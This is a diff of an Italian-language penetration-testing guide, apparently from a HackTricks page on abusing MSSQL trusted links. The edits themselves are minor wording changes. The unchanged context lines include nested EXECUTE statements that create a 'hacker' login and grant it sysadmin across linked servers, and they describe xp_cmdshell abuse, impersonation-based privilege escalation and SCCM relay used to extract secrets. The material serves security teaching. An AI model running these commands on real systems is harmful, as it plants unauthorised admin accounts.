@@ -230,9 +230,9 @@ Nota che metasploit cercherà di abusare solo della funzione `openquery()` in MS
 
 ### Manuale - Openquery()
 
-Da **Linux** puoi ottenere una shell console MSSQL con **sqsh** e **mssqlclient.py.**
+Da **Linux** potresti ottenere una shell della console MSSQL con **sqsh** e **mssqlclient.py.**
 
-Da **Windows** puoi anche trovare i link ed eseguire comandi manualmente utilizzando un **client MSSQL come** [**HeidiSQL**](https://www.heidisql.com)
+Da **Windows** potresti anche trovare i link ed eseguire comandi manualmente utilizzando un **client MSSQL come** [**HeidiSQL**](https://www.heidisql.com)
 
 _Esegui il login utilizzando l'autenticazione di Windows:_
 
@@ -268,13 +268,13 @@ Se non puoi eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con 
 
 ### Manual - EXECUTE
 
-Puoi anche abusare dei link fidati utilizzando `EXECUTE`:
+Puoi anche abusare dei link fidati usando `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Escalazione dei privilegi locali
+## Elevazione dei privilegi locali
 
 L'**utente locale MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo consente all'account di "impersonare un client dopo l'autenticazione".
 
@@ -286,6 +286,7 @@ Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad aut
 
 ### Relay NTLM del Punto di Gestione SCCM (Estrazione dei Segreti OSD)
 Scopri come i ruoli SQL predefiniti dei **Punti di Gestione** SCCM possono essere abusati per estrarre direttamente l'Account di Accesso alla Rete e i segreti della Sequenza di Attività dal database del sito:
+
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
